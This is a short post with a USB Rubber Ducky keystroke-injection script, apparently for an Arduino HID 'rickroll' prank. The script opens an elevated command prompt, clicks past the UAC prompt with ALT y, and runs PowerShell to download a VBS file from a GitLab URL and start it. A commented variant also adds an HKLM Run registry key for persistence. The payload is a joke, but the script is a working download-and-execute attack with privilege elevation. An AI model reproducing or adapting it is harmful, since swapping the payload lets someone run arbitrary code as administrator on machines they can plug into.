GitLab repo: https://gitlab.com/WarKitteh/arduino-hid-rickroll

Ducky code:
`DELAY 1000
GUI x
DELAY 200
UP
REPEAT 7
DELAY 200
ENTER
DELAY 500
ALT y
DELAY 200
STRING powershell (new-object System.Net.WebClient).DownloadFile('https://gitlab.com/WarKitteh/arduino-hid-rickroll/raw/cee63bb220c856587462b29d61bdfc70c806805f/rickroll.vbs','%userprofile%\rickroll.vbs'); && start %userprofile%\rickroll.vbs && exit
REM powershell (new-object System.Net.WebClient).DownloadFile('https://gitlab.com/WarKitteh/arduino-hid-rickroll/raw/cee63bb220c856587462b29d61bdfc70c806805f/rickroll.vbs','%userprofile%\rickroll.vbs'); && start %userprofile%\rickroll.vbs && reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v TotallyNotShadyStartupItem /d %userprofile%\rickroll.vbs && exit
DELAY 200
ENTER`